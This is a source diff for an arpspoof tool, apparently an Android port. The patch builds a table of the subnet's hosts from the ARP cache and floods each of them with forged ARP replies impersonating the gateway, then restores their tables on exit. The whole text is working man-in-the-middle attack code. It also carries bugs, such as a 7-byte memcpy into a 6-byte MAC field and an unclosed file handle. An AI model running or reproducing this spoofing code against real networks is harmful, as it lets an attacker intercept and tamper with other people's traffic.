@@ -33,33 +33,133 @@
 
 #include <droid.h>
 
-#include "arp.h"
+#include "hashmap.h"
 #include "version.h"
 
 #define BROADCAST_MAC_ADDR "\xff\xff\xff\xff\xff\xff"
-
-/*Added since Android's ndk couldn't find ether_ntoa*/
-char *ether_ntoa(struct ether_addr *addr)
-{	//taken from inet/ether_ntoa_r.c
-	static char buf[18];
-	sprintf (buf, "%x:%x:%x:%x:%x:%x",
-        	addr->ether_addr_octet[0], addr->ether_addr_octet[1],
-        	addr->ether_addr_octet[2], addr->ether_addr_octet[3],
-        	addr->ether_addr_octet[4], addr->ether_addr_octet[5]);
-	return buf;
-}
+#define VOID_MAC_ADDR			 "\x00\x00\x00\x00\x00\x00"
 
 static libnet_t *l;
 static struct ether_addr spoof_mac, target_mac;
 static in_addr_t gateway_ip, target_ip;
 static char *iface;
+static Hashmap *netmap = NULL;
 
-static void
-usage(void)
+typedef struct {
+	int address;
+	unsigned char mac[6];
+}
+network_entry_t;
+
+static inline int
+xdigit (char c) {
+    unsigned d;
+    d = (unsigned)(c-'0');
+    if (d < 10) return (int)d;
+    d = (unsigned)(c-'a');
+    if (d < 6) return (int)(10+d);
+    d = (unsigned)(c-'A');
+    if (d < 6) return (int)(10+d);
+    return -1;
+}
+
+/*
+ * Convert Ethernet address in the standard hex-digits-and-colons to binary
+ * representation.
+ * Re-entrant version (GNU extensions)
+ */
+struct ether_addr *
+ether_aton_r (const char *asc, struct ether_addr * addr)
 {
-	printf( "Version : " VERSION "\n"
-			"Usage: arpspoof [-i interface] [-t target] host\n");
-	exit(1);
+    int i, val0, val1;
+    for (i = 0; i < ETHER_ADDR_LEN; ++i) {
+        val0 = xdigit(*asc);
+        asc++;
+        if (val0 < 0)
+            return NULL;
+
+        val1 = xdigit(*asc);
+        asc++;
+        if (val1 < 0)
+            return NULL;
+
+        addr->ether_addr_octet[i] = (u_int8_t)((val0 << 4) + val1);
+
+        if (i < ETHER_ADDR_LEN - 1) {
+            if (*asc != ':')
+                return NULL;
+            asc++;
+        }
+    }
+    if (*asc != '\0')
+        return NULL;
+    return addr;
+}
+
+/*
+ * Convert Ethernet address in the standard hex-digits-and-colons to binary
+ * representation.
+ */
+struct ether_addr *
+ether_aton (const char *asc)
+{
+    static struct ether_addr addr;
+    return ether_aton_r(asc, &addr);
+}
+
+static int arp_cache_lookup( in_addr_t address, struct ether_addr *ether, const char* lif )
+{
+	FILE *fp = fopen( "/proc/net/arp", "r" );
+	int type, flags;
+	int num;
+	unsigned entries = 0, shown = 0;
+	char ip[128];
+	char hwa[128];
+	char mask[128];
+	char line[128];
+	char dev[128];
+
+	if( !fp ) return -1;
+
+	/* Bypass header -- read one line */
+	fgets( line, sizeof(line), fp );
+
+	/* Read the ARP cache entries. */
+	while( fgets(line, sizeof(line), fp) )
+	{
+		/* All these strings can't overflow because fgets above
+		 * reads limited amount of data
+		 */
+		num = sscanf( line, "%s 0x%x 0x%x %s %s %s\n", ip, &type, &flags, hwa, mask, dev );
+		if (num < 4)
+		{
+			printf( "Line with less than 4 expected elements.\n" );
+			continue;
+		}
+
+		// not on the same interface, skip
+		if( strcmp( dev, lif ) != 0 )
+		{
+			printf( "%s != %s.\n", dev, lif );
+			continue;
+		}
+
+		// unknown or broadcast address, skip
+		if( strcmp( hwa, "00:00:00:00:00:00" ) == 0 || strcmp( hwa, "FF:FF:FF:FF:FF:FF" ) == 0 || strcmp( hwa, "ff:ff:ff:ff:ff:ff" ) == 0 )
+			continue;
+
+		// found!
+		if( strcmp( ip, inet_ntoa( *( struct in_addr *)&address ) ) == 0 )
+		{
+			memcpy( ether, (void const *)ether_aton( hwa ), sizeof( struct ether_addr ) );
+
+			printf( "FOUND %s [%s]\n", ip, hwa );
+
+			return 0;
+		}
+	}
+
+	return -1;
 }
 
 static int arp_send( libnet_t *pnet, int arp_op, u_int8_t *sha, in_addr_t spa, u_int8_t *tha, in_addr_t tpa)
@@ -97,72 +197,84 @@ static int arp_send( libnet_t *pnet, int arp_op, u_int8_t *sha, in_addr_t spa, u
 	if( retval == -1 )
 		printf( "libnet_write failed : %s\n", libnet_geterror( pnet ) );
 
+	else
+		printf
+		(
+				"sent spoof from %s [ %x:%x:%x:%x:%x:%x ] to %s [ %x:%x:%x:%x:%x:%x ]\n",
+				inet_ntoa( *(struct in_addr *)&spa ),
+				sha[0], sha[1], sha[2], sha[3], sha[4], sha[5],
+				inet_ntoa( *(struct in_addr *)&tpa ),
+				tha[0], tha[1], tha[2], tha[3], tha[4], tha[5]
+		);
+
 	libnet_clear_packet( pnet );
 
 	return retval;
 }
 
-#ifdef __linux__
-static int
-arp_force(in_addr_t dst)
-{
-	struct sockaddr_in sin;
-	int i, fd;
-	
-	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
-		return (0);
-
-	memset(&sin, 0, sizeof(sin));
-	sin.sin_family = AF_INET;
-	sin.sin_addr.s_addr = dst;
-	sin.sin_port = htons(67);
-	
-	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
-	
-	close(fd);
-	
-	return (i == 0);
-}
-#endif
-
 static int
 arp_find(in_addr_t ip, struct ether_addr *mac)
 {
-	int i = 0;
-
-	do {
-		if (arp_cache_lookup(ip, mac, iface) == 0)
-			return (1);
-#ifdef __linux__
-		/* XXX - force the kernel to arp. feh. */
-		arp_force(ip);
-#else
-		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip);
-#endif
-		sleep(1);
-	}
-	while (i++ < 3);
+	if( arp_cache_lookup(ip, mac, iface) == 0 )
+		return (1);
 
 	return (0);
 }
 
-static void
-cleanup(int sig)
+static void cleanup(int sig)
 {
 	printf( "Restoring arp table ...\n" );
-	int i;
+	int i, j;
 	
-	if (arp_find(gateway_ip, &spoof_mac)) {
-		for (i = 0; i < 3; i++) {
-			/* XXX - on BSD, requires ETHERSPOOF kernel. */
-			arp_send(l, ARPOP_REPLY,
-				 (u_int8_t *)&spoof_mac, gateway_ip,
-				 (target_ip ? (u_int8_t *)&target_mac : NULL),
-				 target_ip);
-			sleep(1);
+	if( netmap == NULL )
+	{
+		if (arp_find(gateway_ip, &spoof_mac)) {
+			for (i = 0; i < 3; i++) {
+				/* XXX - on BSD, requires ETHERSPOOF kernel. */
+				arp_send(l, ARPOP_REPLY,
+					 (u_int8_t *)&spoof_mac, gateway_ip,
+					 (target_ip ? (u_int8_t *)&target_mac : NULL),
+					 target_ip);
+				sleep(1);
+			}
 		}
 	}
+	else
+	{
+		if( arp_find( gateway_ip, &spoof_mac ) )
+		{
+			for( i = 0; i < 3; i++ )
+			{
+				for( j = 0; j < netmap->bucketCount; j++ )
+				{
+						Entry* hentry = netmap->buckets[j];
+						while( hentry != NULL )
+						{
+								Entry 					*next  = hentry->next;
+								network_entry_t *entry = ( network_entry_t * )hentry->value;
+
+								arp_send( l, ARPOP_REPLY, (u_int8_t *)&spoof_mac, gateway_ip, entry->mac, entry->address );
+
+								hentry = next;
+						}
+				}
+
+				sleep(1);
+			}
+		}
+
+		hashmapFree( netmap );
+	}
+
 	exit(0);
+}
+
+int address_hash( void* key ) {
+	return (int)key;
+}
+
+bool address_hash_equals(void* keyA, void* keyB) {
+	return address_hash( keyA ) == address_hash( keyB );
 }
 
 int main(int argc, char *argv[])
@@ -185,20 +297,20 @@ int main(int argc, char *argv[])
 				break;
 			case 't':
 				if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
-					usage();
+					exit(1);
 				break;
 			default:
-				usage();
+				exit(1);
 		}
 	}
 	argc -= optind;
 	argv += optind;
 	
 	if (argc != 1)
-		usage();
+		exit(1);
 	
 	if ((gateway_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
-		usage();
+		exit(1);
 	
 	if (iface == NULL && (iface = pcap_lookupdev(pcap_ebuf)) == NULL) {
 		printf( "%s\n", pcap_ebuf);
@@ -223,7 +335,9 @@ int main(int argc, char *argv[])
 	if( target_ip != 0 )
 	{
 		printf( "Single target mode.\n" );
-		for (;;) {
+
+		for (;;)
+		{
 			arp_send( l, ARPOP_REPLY, NULL, gateway_ip, (target_ip ? (u_int8_t *)&target_mac : NULL), target_ip );
 			sleep(1);
 		}
@@ -240,6 +354,7 @@ int main(int argc, char *argv[])
 		pcap_if_t *ifaces = NULL,
 						  *pcap_iface;
 		pcap_addr_t *pcap_address;
+		network_entry_t *entry;
 
 		if( pcap_findalldevs( &ifaces, pcap_ebuf ) != 0 )
 		{
@@ -274,14 +389,39 @@ int main(int argc, char *argv[])
 		printf( "gateway = %s\n", inet_ntoa( *( struct in_addr *)&gateway_ip ) );
 		printf( "hosts   = %d\n", nhosts );
 
+		netmap = hashmapCreate( nhosts, address_hash, address_hash_equals );
+
+		// precompute addresses
+		for( i = 1; i <= nhosts; i++ )
+		{
+			target_ip = ( ifaddr & netmask ) | htonl(i);
+
+			if( target_ip != ifaddr && target_ip != gateway_ip )
+			{
+				// skip endpoints unknown to arp and broadcasting address
+				if( arp_find( target_ip, &target_mac ) )
+				{
+					entry = ( network_entry_t * )malloc( sizeof( network_entry_t ) );
+
+					entry->address = target_ip;
+					memcpy( &entry->mac, &target_mac, sizeof( BROADCAST_MAC_ADDR ) );
+
+					hashmapPut( netmap, ( void *)target_ip, entry );
+				}
+			}
+		}
+
 		for(;;)
 		{
 			for( i = 1; i <= nhosts; i++ )
 			{
-				int current = ( ifaddr & netmask ) | htonl(i);
+				target_ip = ( ifaddr & netmask ) | htonl(i);
 
-				if( current != ifaddr && current != gateway_ip )
-					arp_send( l, ARPOP_REPLY, NULL, gateway_ip, NULL, current );
+				entry = hashmapGet( netmap, (void *)target_ip );
+				if( entry )
+				{
+					arp_send( l, ARPOP_REPLY, NULL, gateway_ip, (u_int8_t *)&entry->mac, target_ip );
+				}
 			}
 
 			sleep(1);
